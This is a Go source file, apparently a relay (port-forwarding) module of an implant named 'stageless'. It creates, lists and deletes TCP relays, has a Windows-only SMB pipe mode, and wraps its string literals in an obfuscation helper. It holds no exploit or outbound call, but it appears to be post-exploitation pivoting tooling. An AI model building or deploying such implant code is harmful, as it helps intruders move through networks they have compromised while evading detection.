package relay

import (
	"encoding/json"
	"strconv"
	"strings"
	"sync"
	"time"

	general "stageless/utils/general"
	global "stageless/utils"
	"stageless/utils/obf"
)

var (
	mu         sync.Mutex
	relays     = map[string]map[string]any{}
	workers    = map[string]chan struct{}{}
	workerDone = map[string]chan struct{}{}

	relayTCPStartFn func(id string, cfg map[string]any, stop <-chan struct{}, done chan struct{}) string
)

func relayShouldStop(id string) bool {
	// Checks that the relay id is no longer registered
	mu.Lock()
	defer mu.Unlock()
	_, ok := relays[id]
	return !ok
}

func relayMarkStopped(id string) {
	// Marks the relay as stopped and refreshes the active paths
	mu.Lock()
	if stop, ok := workers[id]; ok {
		select {
		case <-stop:
		default:
			close(stop)
		}
		delete(workers, id)
	}
	delete(relays, id)
	delete(workerDone, id)
	mu.Unlock()
	syncActiveRelayPaths()
}

func waitRelayParked(id string) {
	// Waits until the relay worker reports it is parked
	for i := 0; i < 500; i++ {
		mu.Lock()
		done, ok := workerDone[id]
		mu.Unlock()
		if !ok {
			return
		}
		select {
		case <-done:
			return
		default:
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func relayErr(detail string) string {
	// Returns an error string with the given detail
	return obf.S("Error: ") + detail
}

func syncActiveRelayPaths() {
	// Stores the running relay paths in the global list
	paths := make([]string, 0, len(relays))
	for _, entry := range relays {
		running, _ := entry[obf.S("running")].(bool)
		if !running {
			continue
		}
		mode, _ := entry[obf.S("mode")].(string)
		port, _ := entry[obf.S("listenPort")].(int)
		target, _ := entry[obf.S("target")].(string)
		if mode == "" || port <= 0 || target == "" {
			continue
		}
		paths = append(paths, mode+obf.S(";")+global.HostTag+obf.S(":")+strconv.Itoa(port)+obf.S(";")+target)
	}
	global.ActiveRelayPaths = paths
}

func RunRelay(params string) string {
	// Entrypoint that lists the current relays
	return listRelays()
}

func RunRelayCreate(params string) string {
	// Receives the relay config and starts a new relay
	cfg := resolveRelayConfig(params)
	if cfg == nil {
		return relayErr(obf.S("invalid relay config (tcp: --channel tcp --listen PORT --target HOST:PORT)"))
	}
	if win, _ := cfg[obf.S("_winOnly")].(bool); win {
		return obf.S("Windows feature only")
	}
	relayID := relayResolveId(params, cfg)
	if relayID == "" {
		listen, _ := cfg[obf.S("listen")].(string)
		return relayErr(obf.S("invalid listen port in ") + listen)
	}
	mu.Lock()
	if existing, ok := relays[relayID]; ok {
		if running, _ := existing[obf.S("running")].(bool); running {
			mu.Unlock()
			return relayErr(obf.S("relay id '") + relayID + obf.S("' already exists"))
		}
	}
	if dupID := relayFindDuplicate(cfg); dupID != "" {
		mu.Unlock()
		listen, _ := cfg[obf.S("listen")].(string)
		target, _ := cfg[obf.S("target")].(string)
		return relayErr(obf.S("duplicate relay (id=") + dupID + obf.S(") listen=") + listen +
			obf.S(" target=") + target)
	}
	entry := map[string]any{
		obf.S("id"):            relayID,
		obf.S("listen"):        cfg[obf.S("listen")],
		obf.S("target"):        cfg[obf.S("target")],
		obf.S("destinyKind"):   cfg[obf.S("destinyKind")],
		obf.S("mode"):          cfg[obf.S("mode")],
		obf.S("listenPort"):    cfg[obf.S("listenPort")],
		obf.S("destinyScheme"): cfg[obf.S("destinyScheme")],
		obf.S("destinyHost"):   cfg[obf.S("destinyHost")],
		obf.S("destinyPort"):   cfg[obf.S("destinyPort")],
		obf.S("running"):       true,
		obf.S("stop"):          false,
	}
	relays[relayID] = entry
	stop := make(chan struct{})
	done := make(chan struct{})
	workers[relayID] = stop
	workerDone[relayID] = done
	mu.Unlock()
	syncActiveRelayPaths()
	workerCfg := map[string]any{
		obf.S("listenPort"):    entry[obf.S("listenPort")],
		obf.S("channel"):       entry[obf.S("mode")],
		obf.S("destinyRaw"):    entry[obf.S("target")],
		obf.S("destinyKind"):   entry[obf.S("destinyKind")],
		obf.S("destinyScheme"): entry[obf.S("destinyScheme")],
		obf.S("destinyHost"):   entry[obf.S("destinyHost")],
		obf.S("destinyPort"):   entry[obf.S("destinyPort")],
	}
	return relayTCPStartFn(relayID, workerCfg, stop, done)
}

func RunRelayDelete(params string) string {
	// Receives a relay id and stops that relay
	id := relayParam(params, obf.S("id"))
	if id == "" {
		return relayErr(obf.S("missing relay id (--id)"))
	}
	mu.Lock()
	entry, ok := relays[id]
	if !ok {
		mu.Unlock()
		return relayErr(obf.S("relay id '") + id + obf.S("' not found"))
	}
	listen, _ := entry[obf.S("listen")].(string)
	target, _ := entry[obf.S("target")].(string)
	if stop, ok := workers[id]; ok {
		close(stop)
	}
	delete(relays, id)
	mu.Unlock()
	syncActiveRelayPaths()
	waitRelayParked(id)
	mu.Lock()
	delete(workers, id)
	delete(workerDone, id)
	mu.Unlock()
	return obf.S("relay: deleted id=") + id + obf.S(" listen=") + listen + obf.S(" target=") + target
}

func listRelays() string {
	// Builds the text listing of the registered relays
	mu.Lock()
	defer mu.Unlock()
	if len(relays) == 0 {
		return obf.S("(empty)\n")
	}
	const maxValLen = 100
	indent := obf.S("  ")
	var blocks []string
	for rid, entry := range relays {
		listen, _ := entry[obf.S("listen")].(string)
		target, _ := entry[obf.S("target")].(string)
		mode, _ := entry[obf.S("mode")].(string)
		status := obf.S("stopping")
		if running, _ := entry[obf.S("running")].(bool); running {
			status = obf.S("running")
		}
		pairs := []struct{ k, v string }{
			{obf.S("listen"), listen},
			{obf.S("target"), target},
			{obf.S("mode"), mode},
			{obf.S("status"), status},
		}
		if mode == obf.S("smb") {
			pipe, _ := entry[obf.S("pipe")].(string)
			pairs = append(pairs, struct{ k, v string }{obf.S("pipe"), pipe})
		}
		blk := obf.S("[ ") + rid + obf.S(" ]\n")
		for _, p := range pairs {
			v := p.v
			if len(v) > maxValLen {
				v = v[:maxValLen] + obf.S("...")
			}
			blk += indent + p.k + obf.S(": ") + v + obf.S("\n")
		}
		blocks = append(blocks, blk)
	}
	return strings.Join(blocks, obf.S("\n\n"))
}

func relayResolveId(params string, cfg map[string]any) string {
	// Resolves the relay id from params or from the listen port
	id := relayParam(params, obf.S("id"))
	if id != "" {
		return id
	}
	port, _ := cfg[obf.S("listenPort")].(int)
	if port <= 0 {
		return ""
	}
	return strconv.Itoa(port)
}

func relayFindDuplicate(cfg map[string]any) string {
	// Finds a running relay that already matches this config
	cfgPort, _ := cfg[obf.S("listenPort")].(int)
	cfgMode, _ := cfg[obf.S("mode")].(string)
	cfgTarget, _ := cfg[obf.S("target")].(string)
	cfgPipe, _ := cfg[obf.S("pipe")].(string)
	for rid, entry := range relays {
		running, _ := entry[obf.S("running")].(bool)
		if !running {
			continue
		}
		port, _ := entry[obf.S("listenPort")].(int)
		mode, _ := entry[obf.S("mode")].(string)
		if port == cfgPort && mode == cfgMode {
			return rid
		}
		if mode == obf.S("smb") && cfgMode == obf.S("smb") {
			pipe, _ := entry[obf.S("pipe")].(string)
			if pipe == cfgPipe && port == cfgPort {
				return rid
			}
		}
		target, _ := entry[obf.S("target")].(string)
		if target == cfgTarget && port == cfgPort {
			return rid
		}
	}
	return ""
}

func relayParam(params string, keys ...string) string {
	// Reads a trimmed string param from the json payload
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return ""
	}
	for _, key := range keys {
		if v, ok := p[key].(string); ok && strings.TrimSpace(v) != "" {
			return strings.TrimSpace(v)
		}
	}
	return ""
}

func resolveRelayConfig(params string) map[string]any {
	// Parses the relay args and builds the relay config map
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return nil
	}
	argsTable := general.ArgsColonTable(relayParam(params, obf.S("args")))
	pick := func(keys ...string) string {
		// Reads the first non empty value among the given keys
		for _, key := range keys {
			if v, ok := p[key].(string); ok && strings.TrimSpace(v) != "" {
				return strings.TrimSpace(v)
			}
			if v, ok := argsTable[strings.ToLower(key)]; ok {
				return v
			}
		}
		return ""
	}
	listenRaw := pick(obf.S("listen"))
	targetRaw := pick(obf.S("target"))
	if listenRaw == "" || targetRaw == "" {
		return nil
	}
	transport := strings.ToLower(pick(obf.S("channel"), obf.S("mode")))
	if transport == obf.S("smb") {
		return map[string]any{obf.S("_winOnly"): true}
	}
	if transport != obf.S("tcp") {
		return nil
	}
	listenPort := general.ParsePortInt(listenRaw)
	if listenPort <= 0 {
		return nil
	}
	destinyKind, targetClean := general.TargetSchemeParts(targetRaw)
	endpoint := general.ParseRelayEndpoint(targetClean, transport)
	destPort := 0
	if port, ok := endpoint[obf.S("port")].(int); ok {
		destPort = port
	}
	return map[string]any{
		obf.S("listen"):        listenRaw,
		obf.S("target"):        targetRaw,
		obf.S("targetClean"):   targetClean,
		obf.S("destinyKind"):   destinyKind,
		obf.S("mode"):          transport,
		obf.S("listenPort"):    listenPort,
		obf.S("destinyScheme"): endpoint[obf.S("scheme")],
		obf.S("destinyHost"):   endpoint[obf.S("host")],
		obf.S("destinyPort"):   destPort,
		obf.S("pipe"):          "",
		obf.S("pipeName"):      "",
	}
}
